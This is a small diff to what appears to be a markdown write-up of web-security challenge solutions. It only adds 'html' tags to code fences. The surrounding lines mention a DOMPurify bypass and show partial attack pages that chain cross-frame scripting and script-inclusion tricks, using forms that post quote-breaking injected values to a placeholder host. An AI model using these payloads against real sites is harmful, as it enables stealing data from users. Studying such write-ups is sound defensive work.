@@ -177,7 +177,7 @@ Set title as following could make content bypass DOMPurify.
 XFS + XSSI + Some recon
 
 0.html:
-```
+```html
 <form action="http://[HOST]/address" method="post" id="f">
     <input name="address" value='xxxx"'/>
 </form>
@@ -188,7 +188,7 @@ XFS + XSSI + Some recon
 ```
 
 1.html
-```
+```html
 <form action="http://[HOST]/style" method="post" id="f">
     <input name="style" value='"Raw'/>
 </form>
@@ -199,7 +199,7 @@ XFS + XSSI + Some recon
 ```
 
 2.html
-```
+```html
 <div id=iframe2></div>
 <div id=iframe3></div>
 <script id="script1"></script>
